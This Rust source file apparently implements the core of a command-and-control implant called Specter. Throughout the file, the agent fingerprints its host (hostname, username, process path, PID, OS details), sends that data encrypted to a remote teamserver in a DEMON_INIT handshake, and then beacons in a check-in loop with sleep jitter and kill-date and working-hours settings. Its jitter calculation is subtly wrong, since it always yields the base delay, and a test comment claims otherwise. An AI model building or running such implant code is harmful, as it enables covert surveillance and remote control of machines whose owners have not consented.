//! Core agent logic: init handshake and callback loop.

use red_cell_common::crypto::{AgentCryptoMaterial, generate_agent_crypto_material};
use red_cell_common::demon::DemonCommand;
use tracing::{info, warn};

use crate::config::SpecterConfig;
use crate::error::SpecterError;
use crate::protocol::{
    self, AgentMetadata, build_callback_packet, build_init_packet, ctr_blocks_for_len,
    parse_init_ack,
};
use crate::transport::HttpTransport;

/// Running state of a Specter agent session.
#[derive(Debug)]
pub struct SpecterAgent {
    agent_id: u32,
    crypto: AgentCryptoMaterial,
    config: SpecterConfig,
    transport: HttpTransport,
    /// Current CTR block offset for outgoing encryption.
    send_ctr_offset: u64,
    /// Current CTR block offset for incoming decryption.
    recv_ctr_offset: u64,
}

impl SpecterAgent {
    /// Create a new agent with a random ID and fresh crypto material.
    pub fn new(config: SpecterConfig) -> Result<Self, SpecterError> {
        config.validate()?;

        let agent_id = rand::random::<u32>() | 1; // ensure non-zero
        let crypto = generate_agent_crypto_material()?;
        let transport = HttpTransport::new(&config)?;

        info!(agent_id = format_args!("0x{agent_id:08X}"), "agent initialized");

        Ok(Self { agent_id, crypto, config, transport, send_ctr_offset: 0, recv_ctr_offset: 0 })
    }

    /// Collect metadata about the current host environment.
    pub fn collect_metadata(&self) -> AgentMetadata {
        AgentMetadata {
            hostname: hostname(),
            username: username(),
            domain_name: String::from("WORKGROUP"),
            internal_ip: local_ip(),
            process_path: std::env::current_exe()
                .map(|p| p.display().to_string())
                .unwrap_or_default(),
            process_pid: std::process::id(),
            process_tid: 0,
            process_ppid: 0,
            process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
            elevated: false,
            base_address: 0,
            os_major: os_major(),
            os_minor: 0,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: os_build(),
            os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
            sleep_delay: self.config.sleep_delay_ms,
            sleep_jitter: self.config.sleep_jitter,
            kill_date: self.config.kill_date.map_or(0, |kd| kd as u64),
            working_hours: self.config.working_hours.unwrap_or(0),
        }
    }

    /// Perform the DEMON_INIT handshake with the teamserver.
    ///
    /// Sends the init packet and validates the acknowledgement.  On success,
    /// the CTR counters are advanced past the init exchange.
    pub async fn init_handshake(&mut self) -> Result<(), SpecterError> {
        let metadata = self.collect_metadata();
        let packet = build_init_packet(self.agent_id, &self.crypto, &metadata)?;

        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "sending DEMON_INIT");

        let response = self.transport.send(&packet).await?;
        let ack_blocks = parse_init_ack(&response, self.agent_id, &self.crypto)?;

        // After init, the server encrypted the ACK at offset 0 and advanced by ack_blocks.
        // We decrypted at offset 0 and must advance our recv counter to match.
        self.recv_ctr_offset = ack_blocks;
        // The init metadata was encrypted at offset 0 by us.  The server decrypted it
        // at offset 0 and advanced by the metadata ciphertext length.
        // Our send counter advances by the same amount.
        let metadata_plaintext = protocol::serialize_init_metadata_len(self.agent_id, &metadata);
        self.send_ctr_offset = ctr_blocks_for_len(metadata_plaintext);

        info!(
            agent_id = format_args!("0x{:08X}", self.agent_id),
            send_ctr = self.send_ctr_offset,
            recv_ctr = self.recv_ctr_offset,
            "DEMON_INIT handshake complete"
        );

        Ok(())
    }

    /// Send a `COMMAND_CHECKIN` callback to the teamserver.
    pub async fn checkin(&mut self) -> Result<Vec<u8>, SpecterError> {
        let command_id = u32::from(DemonCommand::CommandCheckin);
        let request_id = 0_u32;

        let packet = build_callback_packet(
            self.agent_id,
            &self.crypto,
            self.send_ctr_offset,
            command_id,
            request_id,
            &[], // empty payload for a simple checkin
        )?;

        let response = self.transport.send(&packet).await?;

        // Advance send CTR by the encrypted payload length
        // The encrypted payload is the entire envelope payload (command_id + request_id + len + data)
        let encrypted_len = 4 + 4 + 4; // command_id + request_id + payload_len (0 bytes payload)
        self.send_ctr_offset += ctr_blocks_for_len(encrypted_len);

        Ok(response)
    }

    /// Run the main agent loop: init, then checkin repeatedly.
    pub async fn run(&mut self) -> Result<(), SpecterError> {
        self.init_handshake().await?;

        loop {
            let delay = self.compute_sleep_delay();
            tokio::time::sleep(std::time::Duration::from_millis(delay)).await;

            match self.checkin().await {
                Ok(response) => {
                    if !response.is_empty() {
                        info!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            response_len = response.len(),
                            "received tasking response"
                        );
                    }
                }
                Err(e) => {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "checkin failed, will retry"
                    );
                }
            }
        }
    }

    /// Compute the sleep delay in milliseconds, applying jitter if configured.
    fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }
        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let jitter = rand::random::<u64>() % (jitter_range + 1);
        base.saturating_sub(jitter / 2) + jitter / 2
    }

    /// Return the agent ID.
    #[must_use]
    pub fn agent_id(&self) -> u32 {
        self.agent_id
    }
}

/// Get the hostname of the current machine.
fn hostname() -> String {
    std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| String::from("unknown"))
}

/// Get the current username.
fn username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| String::from("unknown"))
}

/// Get a local IP address (best effort).
fn local_ip() -> String {
    String::from("127.0.0.1")
}

/// Get the OS major version.
fn os_major() -> u32 {
    if cfg!(target_os = "linux") {
        // Linux doesn't have Windows version numbers; use a placeholder
        0
    } else {
        10 // Windows 10+
    }
}

/// Get the OS build number.
fn os_build() -> u32 {
    0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn agent_creation_succeeds() {
        let config = SpecterConfig::default();
        let agent = SpecterAgent::new(config);
        assert!(agent.is_ok());
        let agent = agent.expect("already checked");
        assert_ne!(agent.agent_id(), 0);
    }

    #[test]
    fn agent_metadata_has_correct_arch_on_x86_64() {
        let config = SpecterConfig::default();
        let agent = SpecterAgent::new(config).expect("agent");
        let meta = agent.collect_metadata();
        if cfg!(target_arch = "x86_64") {
            assert_eq!(meta.process_arch, 2);
            assert_eq!(meta.os_arch, 9);
        }
    }

    #[test]
    fn compute_sleep_delay_no_jitter() {
        let config = SpecterConfig { sleep_delay_ms: 1000, sleep_jitter: 0, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert_eq!(agent.compute_sleep_delay(), 1000);
    }

    #[test]
    fn compute_sleep_delay_with_jitter_is_in_range() {
        let config =
            SpecterConfig { sleep_delay_ms: 10000, sleep_jitter: 50, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        for _ in 0..100 {
            let delay = agent.compute_sleep_delay();
            // With 50% jitter on 10000ms, delay should be roughly 5000–15000
            // but our formula keeps it within [base - jitter_range/2, base + jitter_range/2]
            assert!(delay > 0);
            assert!(delay <= 15000);
        }
    }
}
